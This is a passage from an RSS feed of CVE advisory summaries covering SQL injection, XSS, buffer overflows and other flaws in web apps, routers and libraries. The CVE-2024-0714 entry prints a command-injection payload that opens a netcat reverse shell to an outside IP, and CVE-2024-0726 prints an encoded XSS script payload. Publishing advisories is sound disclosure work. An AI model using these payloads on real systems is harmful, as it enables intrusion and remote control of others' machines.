`/api/v1/watch/&lt;uuid&gt;/history` can be accessed by any unauthorized user. As a result any unauthorized user can check one's watch history. However, because unauthorized party first needs to know a watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal. This issue has been addressed in version 0.45.13. Users are advised to upgrade. There are no known workarounds for this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:45 +0000</pubDate></item><item><title>CVE-2024-23331 | Vite dev server option `server.fs.deny` can be bypassed when hosted on case-insensitive filesystem</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23331</link><description>Vite is a frontend tooling framework for javascript. The Vite dev server option `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows. This bypass is similar to CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems. Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn't discriminate; a blacklist bypass is possible. By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. This issue has been addressed in vite@5.0.12, vite@4.5.2, vite@3.2.8, and vite@2.9.17. Users are advised to upgrade. Users unable to upgrade should restrict access to dev servers.</description><pubDate>Sun, 21 Jan 2024 15:49:47 +0000</pubDate></item><item><title>CVE-2023-33295 | Cohesity DataProtect 6.8.1 and 6.6.0d was discovered to have a incorrect access control vulnerability due to a lack of TLS Certificate Valid...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-33295</link><description>Cohesity DataProtect 6.8.1 and 6.6.0d was discovered to have a incorrect access control vulnerability due to a lack of TLS Certificate Validation.</description><pubDate>Sun, 21 Jan 2024 15:49:47 +0000</pubDate></item><item><title>CVE-2024-0731 | PCMan FTP Server PUT Command denial of service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0731</link><description>A vulnerability has been found in PCMan FTP Server 2.0.7 and classified as problematic. This vulnerability affects unknown code of the component PUT Command Handler. The manipulation leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-251554 is the identifier assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:48 +0000</pubDate></item><item><title>CVE-2023-50694 | An issue in dom96 HTTPbeast v.0.4.1 and before allows a remote attacker to execute arbitrary code via a crafted request to the parser.nim co...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-50694</link><description>An issue in dom96 HTTPbeast v.0.4.1 and before allows a remote attacker to execute arbitrary code via a crafted request to the parser.nim component.</description><pubDate>Sun, 21 Jan 2024 15:49:49 +0000</pubDate></item><item><title>CVE-2024-0730 | Project Worlds Online Time Table Generator course_ajax.php sql injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0730</link><description>A vulnerability, which was classified as critical, was found in Project Worlds Online Time Table Generator 1.0. This affects an unknown part of the file course_ajax.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251553 was assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:51 +0000</pubDate></item><item><title>CVE-2024-0728 | ForU CMS channel.php file inclusion</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0728</link><description>A vulnerability classified as problematic was found in ForU CMS up to 2020-06-23. Affected by this vulnerability is an unknown functionality of the file channel.php. The manipulation of the argument c_cmodel leads to file inclusion. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251551.</description><pubDate>Sun, 21 Jan 2024 15:49:52 +0000</pubDate></item><item><title>CVE-2024-0729 | ForU CMS cms_admin.php sql injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0729</link><description>A vulnerability, which was classified as critical, has been found in ForU CMS up to 2020-06-23. Affected by this issue is some unknown functionality of the file cms_admin.php. The manipulation of the argument a_name leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251552.</description><pubDate>Sun, 21 Jan 2024 15:49:52 +0000</pubDate></item><item><title>CVE-2024-0725 | ProSSHD denial of service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0725</link><description>A vulnerability was found in ProSSHD 1.2 on Windows. It has been declared as problematic. This vulnerability affects unknown code. The manipulation leads to denial of service. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251548.</description><pubDate>Sun, 21 Jan 2024 15:49:53 +0000</pubDate></item><item><title>CVE-2024-0726 | Project Worlds Student Project Allocation System Admin Login Module admin_login.php cross site scripting</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0726</link><description>A vulnerability was found in Project Worlds Student Project Allocation System 1.0. It has been rated as problematic. This issue affects some unknown processing of the file admin_login.php of the component Admin Login Module. The manipulation of the argument msg with the input test%22%3Cscript%3Ealert(%27Torada%27)%3C/script%3E leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251549 was assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:49:53 +0000</pubDate></item><item><title>CVE-2024-22955 | swftools 0.9.2 was discovered to contain a stack-buffer-underflow vulnerability via the function parseExpression at swftools/src/swfc.c:2576...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22955</link><description>swftools 0.9.2 was discovered to contain a stack-buffer-underflow vulnerability via the function parseExpression at swftools/src/swfc.c:2576.</description><pubDate>Sun, 21 Jan 2024 15:49:54 +0000</pubDate></item><item><title>CVE-2024-22956 | swftools 0.9.2 was discovered to contain a heap-use-after-free vulnerability via the function removeFromTo at swftools/src/swfc.c:838</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22956</link><description>swftools 0.9.2 was discovered to contain a heap-use-after-free vulnerability via the function removeFromTo at swftools/src/swfc.c:838</description><pubDate>Sun, 21 Jan 2024 15:49:54 +0000</pubDate></item><item><title>CVE-2024-22957 | swftools 0.9.2 was discovered to contain an Out-of-bounds Read vulnerability via the function dict_do_lookup in swftools/lib/q.c:1190.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22957</link><description>swftools 0.9.2 was discovered to contain an Out-of-bounds Read vulnerability via the function dict_do_lookup in swftools/lib/q.c:1190.</description><pubDate>Sun, 21 Jan 2024 15:49:55 +0000</pubDate></item><item><title>CVE-2024-22919 | swftools0.9.2 was discovered to contain a global-buffer-overflow vulnerability via the function parseExpression at swftools/src/swfc.c:2587.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22919</link><description>swftools0.9.2 was discovered to contain a global-buffer-overflow vulnerability via the function parseExpression at swftools/src/swfc.c:2587.</description><pubDate>Sun, 21 Jan 2024 15:49:55 +0000</pubDate></item><item><title>CVE-2024-22911 | A stack-buffer-underflow vulnerability was found in SWFTools v0.9.2, in the function parseExpression at src/swfc.c:2602.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22911</link><description>A stack-buffer-underflow vulnerability was found in SWFTools v0.9.2, in the function parseExpression at src/swfc.c:2602.</description><pubDate>Sun, 21 Jan 2024 15:49:56 +0000</pubDate></item><item><title>CVE-2024-22912 | A global-buffer-overflow was found in SWFTools v0.9.2, in the function countline at swf5compiler.flex:327. It allows an attacker to cause co...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22912</link><description>A global-buffer-overflow was found in SWFTools v0.9.2, in the function countline at swf5compiler.flex:327. It allows an attacker to cause code execution.</description><pubDate>Sun, 21 Jan 2024 15:49:57 +0000</pubDate></item><item><title>CVE-2024-22913 | A heap-buffer-overflow was found in SWFTools v0.9.2, in the function swf5lex at lex.swf5.c:1321. It allows an attacker to cause code executi...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22913</link><description>A heap-buffer-overflow was found in SWFTools v0.9.2, in the function swf5lex at lex.swf5.c:1321. It allows an attacker to cause code execution.</description><pubDate>Sun, 21 Jan 2024 15:49:57 +0000</pubDate></item><item><title>CVE-2024-22914 | A heap-use-after-free was found in SWFTools v0.9.2, in the function input at lex.swf5.c:2620. It allows an attacker to cause denial of servi...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22914</link><description>A heap-use-after-free was found in SWFTools v0.9.2, in the function input at lex.swf5.c:2620. It allows an attacker to cause denial of service.</description><pubDate>Sun, 21 Jan 2024 15:49:57 +0000</pubDate></item><item><title>CVE-2024-22915 | A heap-use-after-free was found in SWFTools v0.9.2, in the function swf_DeleteTag at rfxswf.c:1193. It allows an attacker to cause code exec...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22915</link><description>A heap-use-after-free was found in SWFTools v0.9.2, in the function swf_DeleteTag at rfxswf.c:1193. It allows an attacker to cause code execution.</description><pubDate>Sun, 21 Jan 2024 15:49:58 +0000</pubDate></item><item><title>CVE-2023-47034 | A vulnerability in UniswapFrontRunBot 0xdB94c allows attackers to cause financial losses via unspecified vectors.</title><link>https://www.cve.org/CVERecord?id=CVE-2023-47034</link><description>A vulnerability in UniswapFrontRunBot 0xdB94c allows attackers to cause financial losses via unspecified vectors.</description><pubDate>Sun, 21 Jan 2024 15:49:59 +0000</pubDate></item><item><title>CVE-2023-47033 | MultiSigWallet 0xF0C99 was discovered to contain a reentrancy vulnerability via the function executeTransaction.</title><link>https://www.cve.org/CVERecord?id=CVE-2023-47033</link><description>MultiSigWallet 0xF0C99 was discovered to contain a reentrancy vulnerability via the function executeTransaction.</description><pubDate>Sun, 21 Jan 2024 15:49:59 +0000</pubDate></item><item><title>CVE-2024-0722 | code-projects Social Networking Site Message Page message.php cross site scripting</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0722</link><description>A vulnerability was found in code-projects Social Networking Site 1.0 and classified as problematic. Affected by this issue is some unknown functionality of the file message.php of the component Message Page. The manipulation of the argument Story leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-251546 is the identifier assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:50:00 +0000</pubDate></item><item><title>CVE-2024-0723 | freeSSHd denial of service</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0723</link><description>A vulnerability was found in freeSSHd 1.0.9 on Windows. It has been classified as problematic. This affects an unknown part. The manipulation leads to denial of service. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251547.</description><pubDate>Sun, 21 Jan 2024 15:50:01 +0000</pubDate></item><item><title>CVE-2024-0720 | FactoMineR FactoInvestigate HTML Report Generator cross site scripting</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0720</link><description>A vulnerability, which was classified as problematic, was found in FactoMineR FactoInvestigate up to 1.9. Affected is an unknown function of the component HTML Report Generator. The manipulation leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251544. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.</description><pubDate>Sun, 21 Jan 2024 15:50:01 +0000</pubDate></item><item><title>CVE-2024-0721 | Jspxcms Survey Label cross site scripting</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0721</link><description>A vulnerability has been found in Jspxcms 10.2.0 and classified as problematic. Affected by this vulnerability is an unknown functionality of the component Survey Label Handler. The manipulation leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251545 was assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:50:02 +0000</pubDate></item><item><title>CVE-2024-0717 | D-Link Good Line Router v2 HTTP GET Request devinfo information disclosure</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0717</link><description>A vulnerability classified as critical was found in D-Link DAP-1360, DIR-300, DIR-615, DIR-615GF, DIR-615S, DIR-615T, DIR-620, DIR-620S, DIR-806A, DIR-815, DIR-815AC, DIR-815S, DIR-816, DIR-820, DIR-822, DIR-825, DIR-825AC, DIR-825ACF, DIR-825ACG1, DIR-841, DIR-842, DIR-842S, DIR-843, DIR-853, DIR-878, DIR-882, DIR-1210, DIR-1260, DIR-2150, DIR-X1530, DIR-X1860, DSL-224, DSL-245GR, DSL-2640U, DSL-2750U, DSL-G2452GR, DVG-5402G, DVG-5402G, DVG-5402GFRU, DVG-N5402G, DVG-N5402G-IL, DWM-312W, DWM-321, DWR-921, DWR-953 and Good Line Router v2 up to 20240112. This vulnerability affects unknown code of the file /devinfo of the component HTTP GET Request Handler. The manipulation of the argument area with the input notice|net|version leads to information disclosure. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-251542 is the identifier assigned to this vulnerability.</description><pubDate>Sun, 21 Jan 2024 15:50:03 +0000</pubDate></item><item><title>CVE-2024-0718 | liuwy-dlsdys zhglxt HTTP POST Request edit cross site scripting</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0718</link><description>A vulnerability, which was classified as problematic, has been found in liuwy-dlsdys zhglxt 4.7.7. This issue affects some unknown processing of the file /oa/notify/edit of the component HTTP POST Request Handler. The manipulation of the argument notifyTitle leads to cross site scripting. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251543.</description><pubDate>Sun, 21 Jan 2024 15:50:03 +0000</pubDate></item><item><title>CVE-2024-0716 | Beijing Baichuo Smart S150 Management Platform Backup File download.php information disclosure</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0716</link><description>A vulnerability classified as problematic has been found in Beijing Baichuo Smart S150 Management Platform V31R02B15. This affects an unknown part of the file /log/download.php of the component Backup File Handler. The manipulation leads to information disclosure. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The identifier VDB-251541 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.</description><pubDate>Sun, 21 Jan 2024 15:50:04 +0000</pubDate></item><item><title>CVE-2022-47160 | WordPress Wp Social Plugin &amp;lt;= 1.9.0 is vulnerable to Sensitive Data Exposure</title><link>https://www.cve.org/CVERecord?id=CVE-2022-47160</link><description>Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Wpmet Wp Social Login and Register Social Counter.This issue affects Wp Social Login and Register Social Counter: from n/a through 1.9.0.</description><pubDate>Sun, 21 Jan 2024 15:50:05 +0000</pubDate></item><item><title>CVE-2024-22562 | swftools 0.9.2 was discovered to contain a Stack Buffer Underflow via the function dict_foreach_keyvalue at swftools/lib/q.c.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22562</link><description>swftools 0.9.2 was discovered to contain a Stack Buffer Underflow via the function dict_foreach_keyvalue at swftools/lib/q.c.</description><pubDate>Sun, 21 Jan 2024 15:50:05 +0000</pubDate></item><item><title>CVE-2022-45845 | WordPress Smart Slider 3 Plugin &amp;lt;= 3.5.1.9 is vulnerable to PHP Object Injection</title><link>https://www.cve.org/CVERecord?id=CVE-2022-45845</link><description>Deserialization of Untrusted Data vulnerability in Nextend Smart Slider 3.This issue affects Smart Slider 3: from n/a through 3.5.1.9.</description><pubDate>Sun, 21 Jan 2024 15:50:06 +0000</pubDate></item><item><title>CVE-2024-22563 | openvswitch 2.17.8 was discovered to contain a memory leak via the function xmalloc__ in openvswitch-2.17.8/lib/util.c.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22563</link><description>openvswitch 2.17.8 was discovered to contain a memory leak via the function xmalloc__ in openvswitch-2.17.8/lib/util.c.</description><pubDate>Sun, 21 Jan 2024 15:50:06 +0000</pubDate></item><item><title>CVE-2022-45083 | WordPress ProfilePress Plugin &amp;lt;= 4.3.2 is vulnerable to PHP Object Injection</title><link>https://www.cve.org/CVERecord?id=CVE-2022-45083</link><description>Deserialization of Untrusted Data vulnerability in ProfilePress Membership Team Paid Membership Plugin, Ecommerce, User Registration Form, Login Form, User Profile &amp; Restrict Content – ProfilePress.This issue affects Paid Membership Plugin, Ecommerce, User Registration Form, Login Form, User Profile &amp; Restrict Content – ProfilePress: from n/a through 4.3.2.</description><pubDate>Sun, 21 Jan 2024 15:50:07 +0000</pubDate></item><item><title>CVE-2022-40700 | Server Side Request Forgery (SSRF) vulnerability affecting multiple WordPress plugins</title><link>https://www.cve.org/CVERecord?id=CVE-2022-40700</link><description>Server-Side Request Forgery (SSRF) vulnerability in Montonio Montonio for WooCommerce, Wpopal Wpopal Core Features, AMO for WP – Membership Management ArcStone wp-amo, Long Watch Studio WooVirtualWallet – A virtual wallet for WooCommerce, Long Watch Studio WooVIP – Membership plugin for WordPress and WooCommerce, Long Watch Studio WooSupply – Suppliers, Supply Orders and Stock Management, Squidesma Theme Minifier, Paul Clark Styles styles, Designmodo Inc. WordPress Page Builder – Qards, Philip M. Hofer (Frumph) PHPFreeChat, Arun Basil Lal Custom Login Admin Front-end CSS, Team Agence-Press CSS Adder By Agence-Press, Unihost Confirm Data, deano1987 AMP Toolbox amp-toolbox, Arun Basil Lal Admin CSS MU.This issue affects Montonio for WooCommerce: from n/a through 6.0.1; Wpopal Core Features: from n/a through 1.5.8; ArcStone: from n/a through 4.6.6; WooVirtualWallet – A virtual wallet for WooCommerce: from n/a through 2.2.1; WooVIP – Membership plugin for WordPress and WooCommerce: from n/a through 1.4.4; WooSupply – Suppliers, Supply Orders and Stock Management: from n/a through 1.2.2; Theme Minifier: from n/a through 2.0; Styles: from n/a through 1.2.3; WordPress Page Builder – Qards: from n/a through 1.0.5; PHPFreeChat: from n/a through 0.2.8; Custom Login Admin Front-end CSS: from n/a through 1.4.1; CSS Adder By Agence-Press: from n/a through 1.5.0; Confirm Data: from n/a through 1.0.7; AMP Toolbox: from n/a through 2.1.1; Admin CSS MU: from n/a through 2.6.</description><pubDate>Sun, 21 Jan 2024 15:50:08 +0000</pubDate></item><item><title>CVE-2024-0714 | MiczFlor RPi-Jukebox-RFID HTTP Request userScripts.php os command injection</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0714</link><description>A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.</description><pubDate>Sun, 21 Jan 2024 15:50:08 +0000</pubDate></item><item><title>CVE-2024-22920 | swftools 0.9.2 was discovered to contain a heap-use-after-free via the function bufferWriteData in swftools/lib/action/compile.c.</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22920</link><description>swftools 0.9.2 was discovered to contain a heap-use-after-free via the function bufferWriteData in swftools/lib/action/compile.c.</description><pubDate>Sun, 21 Jan 2024 15:50:09 +0000</pubDate></item><item><title>CVE-2024-22876 | StrangeBee TheHive 5.1.0 to 5.1.9 and 5.2.0 to 5.2.8 is vulnerable to Cross Site Scripting (XSS) in the case attachment functionality which ...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22876</link><description>StrangeBee TheHive 5.1.0 to 5.1.9 and 5.2.0 to 5.2.8 is vulnerable to Cross Site Scripting (XSS) in the case attachment functionality which enables an attacker to upload a malicious HTML file with Javascript code that will be executed in the context of the The Hive application using a specific URL. The vulnerability can be used to coerce a victim account to perform specific actions on the application as helping an analyst becoming administrator.</description><pubDate>Sun, 21 Jan 2024 15:50:10 +0000</pubDate></item><item><title>CVE-2024-22877 | StrangeBee TheHive 5.2.0 to 5.2.8 is vulnerable to Cross Site Scripting (XSS) in the case reporting functionality. This feature allows an at...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22877</link><description>StrangeBee TheHive 5.2.0 to 5.2.8 is vulnerable to Cross Site Scripting (XSS) in the case reporting functionality. This feature allows an attacker to insert malicious JavaScript code inside the template or its variables, that will be executed in the context of the TheHive application when the HTML report is opened.</description><pubDate>Sun, 21 Jan 2024 15:50:11 +0000</pubDate></item><item><title>CVE-2023-51948 | A Site-wide directory listing vulnerability in /fm in actidata actiNAS SL 2U-8 RDX 3.2.03-SP1 allows remote attackers to list the files host...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51948</link><description>A Site-wide directory listing vulnerability in /fm in actidata actiNAS SL 2U-8 RDX 3.2.03-SP1 allows remote attackers to list the files hosted by the web application.</description><pubDate>Sun, 21 Jan 2024 15:50:11 +0000</pubDate></item><item><title>CVE-2024-0713 | Monitorr Services Configuration upload.php unrestricted upload</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0713</link><description>A vulnerability was found in Monitorr 1.7.6m. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /assets/php/upload.php of the component Services Configuration. The manipulation of the argument fileToUpload leads to unrestricted upload. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251539. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.</description><pubDate>Sun, 21 Jan 2024 15:50:12 +0000</pubDate></item><item><title>CVE-2023-51946 | Multiple reflected cross-site scripting (XSS) vulnerabilities in nasSvr.php in actidata actiNAS-SL-2U-8 3.2.03-SP1 allow remote attackers to...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51946</link><description>Multiple reflected cross-site scripting (XSS) vulnerabilities in nasSvr.php in actidata actiNAS-SL-2U-8 3.2.03-SP1 allow remote attackers to inject arbitrary web script or HTML.</description><pubDate>Sun, 21 Jan 2024 15:50:13 +0000</pubDate></item><item><title>CVE-2023-51947 | Improper access control on nasSvr.php in actidata actiNAS SL 2U-8 RDX 3.2.03-SP1 allows remote attackers to read and modify different types ...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-51947</link><description>Improper access control on nasSvr.php in actidata actiNAS SL 2U-8 RDX 3.2.03-SP1 allows remote attackers to read and modify different types of data without authentication.</description><pubDate>Sun, 21 Jan 2024 15:50:13 +0000</pubDate></item><item><title>CVE-2023-27168 | An arbitrary file upload vulnerability in Xpand IT Write-back Manager v2.3.1 allows attackers to execute arbitrary code via a crafted jsp fi...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-27168</link><description>An arbitrary file upload vulnerability in Xpand IT Write-back Manager v2.3.1 allows attackers to execute arbitrary code via a crafted jsp file.</description><pubDate>Sun, 21 Jan 2024 15:50:14 +0000</pubDate></item><item><title>CVE-2023-46351 | In the module mib &lt; 1.6.1 from MyPresta.eu for PrestaShop, a guest can perform SQL injection. The methods `mib::getManufacturersByCategory()...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-46351</link><description>In the module mib &lt; 1.6.1 from MyPresta.eu for PrestaShop, a guest can perform SQL injection. The methods `mib::getManufacturersByCategory()` has sensitive SQL calls that can be executed with a trivial http call and exploited to forge a SQL injection.</description><pubDate>Sun, 21 Jan 2024 15:50:15 +0000</pubDate></item><item><title>CVE-2023-50030 | In the module "Jms Setting" (jmssetting) from Joommasters for PrestaShop, a guest can perform SQL injection in versions &lt;= 1.1.0. The method...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-50030</link><description>In the module "Jms Setting" (jmssetting) from Joommasters for PrestaShop, a guest can perform SQL injection in versions &lt;= 1.1.0. The method `JmsSetting::getSecondImgs()` has a sensitive SQL call that can be executed with a trivial http call and exploited to forge a blind SQL injection.</description><pubDate>Sun, 21 Jan 2024 15:50:16 +0000</pubDate></item><item><title>CVE-2024-0712 | Beijing Baichuo Smart S150 Management Platform userattea.php access control</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0712</link><description>A vulnerability was found in Beijing Baichuo Smart S150 Management Platform V31R02B15. It has been classified as critical. Affected is an unknown function of the file /useratte/inc/userattea.php. The manipulation leads to improper access controls. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-251538 is the identifier assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.</description><pubDate>Sun, 21 Jan 2024 15:50:16 +0000</pubDate></item><item><title>CVE-2023-43985 | SunnyToo stblogsearch up to v1.0.0 was discovered to contain a SQL injection vulnerability via the StBlogSearchClass::prepareSearch componen...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-43985</link><description>SunnyToo stblogsearch up to v1.0.0 was discovered to contain a SQL injection vulnerability via the StBlogSearchClass::prepareSearch component.</description><pubDate>Sun, 21 Jan 2024 15:50:17 +0000</pubDate></item><item><title>CVE-2023-50028 | In the module "Sliding cart block" (blockslidingcart) up to version 2.3.8 from PrestashopModules.eu for PrestaShop, a guest can perform SQL ...</title><link>https://www.cve.org/CVERecord?id=CVE-2023-50028</link><description>In the module "Sliding cart block" (blockslidingcart) up to version 2.3.8 from PrestashopModules.eu for PrestaShop, a guest can perform SQL injection.</description><pubDate>Sun, 21 Jan 2024 15:50:18 +0000</pubDate></item><item><title>CVE-2024-21733 | Apache Tomcat: Leaking of unrelated request bodies in default error page</title><link>https://www.cve.org/CVERecord?id=CVE-2024-21733</link><description>Generation of Error Message Containing Sensitive Information vulnerability in Apache Tomcat.This issue affects Apache Tomcat: from 8.5.7 through 8.5.63, from 9.0.0-M11 through 9.0.43.

Users are recommended to upgrade to version 8.5.64 onwards or 9.0.44 onwards, which contain a fix for the issue.</description><pubDate>Sun, 21 Jan 2024 15:50:19 +0000</pubDate></item><item><title>CVE-2024-0705 | The Stripe Payment Plugin for WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'id' parameter in all versions up to, ...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-0705</link><description>The Stripe Payment Plugin for WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'id' parameter in all versions up to, and including, 3.7.9 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.</description><pubDate>Sun, 21 Jan 2024 15:50:19 +0000</pubDate></item><item><title>CVE-2024-23659 | SPIP before 4.1.14 and 4.2.x before 4.2.8 allows XSS via the name of an uploaded file. This is related to javascript/bigup.js and javascript...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23659</link><description>SPIP before 4.1.14 and 4.2.x before 4.2.8 allows XSS via the name of an uploaded file. This is related to javascript/bigup.js and javascript/bigup.utils.js.</description><pubDate>Sun, 21 Jan 2024 15:50:20 +0000</pubDate></item><item><title>CVE-2024-23387 | FusionPBX prior to 5.1.0 contains a cross-site scripting vulnerability. If this vulnerability is exploited by a remote authenticated attacke...</title><link>https://www.cve.org/CVERecord?id=CVE-2024-23387</link><description>FusionPBX prior to 5.1.0 contains a cross-site scripting vulnerability. If this vulnerability is exploited by a remote authenticated attacker with an administrative privilege, an arbitrary script may be executed on the web browser of the user who is logging in to the product.</description><pubDate>Sun, 21 Jan 2024 15:50:21 +0000</pubDate></item><item><title>CVE-2023-5716 | ASUS Armoury Crate - Arbitrary File Write</title><link>https://www.cve.org/CVERecord?id=CVE-2023-5716</link><description>ASUS Armoury Crate has a vulnerability in arbitrary file write and allows remote attackers to access or modify arbitrary files by sending specific HTTP requests without permission.</description><pubDate>Sun, 21 Jan 2024 15:50:22 +0000</pubDate></item><item><title>CVE-2023-32337 | IBM Maximo Spatial Asset Management server-side request forgery</title><link>https://www.cve.org/CVERecord?id=CVE-2023-32337</link><description>IBM Maximo Spatial Asset Management 8.10 is vulnerable to server-side request forgery (SSRF). This may allow an authenticated attacker to send unauthorized requests from the system, potentially leading to network enumeration or facilitating other attacks.  IBM X-Force ID:  255288.</description><pubDate>Sun, 21 Jan 2024 15:50:23 +0000</pubDate></item><item><title>CVE-2023-47718 | IBM Maximo Asset Management cross-site request forgery</title><link>https://www.cve.org/CVERecord?id=CVE-2023-47718</link><description>IBM Maximo Asset Management 7.6.1.3 and Manage Component 8.10 through 8.11 is vulnerable to cross-site request forgery which could allow an attacker to execute malicious and unauthorized actions transmitted from a user that the website trusts.  IBM X-Force ID:  271843.</description><pubDate>Sun, 21 Jan 2024 15:50:23 +0000</pubDate></item><item><title>CVE-2023-50963 | IBM Storage Defender HTTP HOST header injection</title><link>https://www.cve.org/CVERecord?id=CVE-2023-50963</link><description>IBM Storage Defender - Data Protect 1.0.0 through 1.4.1 is vulnerable to HTTP header injection, caused by improper validation of input by the HOST headers.  This could allow an attacker to conduct various attacks against the vulnerable system, including cross-site scripting, cache poisoning or session hijacking.  IBM X-Force ID:  276101.</description><pubDate>Sun, 21 Jan 2024 15:50:24 +0000</pubDate></item><item><title>CVE-2023-35020 | IBM Sterling Control Center directory traversal</title><link>https://www.cve.org/CVERecord?id=CVE-2023-35020</link><description>IBM Sterling Control Center 6.3.0 could allow a remote attacker to traverse directories on the system. An attacker could send a specially crafted URL request containing "dot dot" sequences (/../) to view arbitrary files on the system.  IBM X-Force ID:  257874.</description><pubDate>Sun, 21 Jan 2024 15:50:24 +0000</pubDate></item><item><title>CVE-2023-40683 | IBM OpenPages with Watson privilege escalation</title><link>https://www.cve.org/CVERecord?id=CVE-2023-40683</link><description>IBM OpenPages with Watson 8.3 and 9.0 could allow remote attacker to bypass security restrictions, caused by insufficient authorization checks. By authenticating as an OpenPages user and using non-public APIs, an attacker could exploit this vulnerability to bypass security and gain unauthorized administrative access to the application.  IBM X-Force ID:  264005.</description><pubDate>Sun, 21 Jan 2024 15:50:25 +0000</pubDate></item><item><title>CVE-2023-38738 | IBM OpenPages with Watson information disclosure</title><link>https://www.cve.org/CVERecord?id=CVE-2023-38738</link><description>IBM OpenPages with Watson 8.3 and 9.0 could provide weaker than expected security in a OpenPages environment using Native authentication. If OpenPages is using Native authentication an attacker with access to the OpenPages database could through a series of specially crafted steps could exploit this weakness and gain unauthorized access to other OpenPages accounts. IBM X-Force ID: 262594.</description><pubDate>Sun, 21 Jan 2024 15:50:26 +0000</pubDate></item><item><title>CVE-2024-22424 | Cross-Site Request Forgery (CSRF) in github.com/argoproj/argo-cd</title><link>https://www.cve.org/CVERecord?id=CVE-2024-22424</link><description>Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.15 are vulnerable to a cross-server request forgery 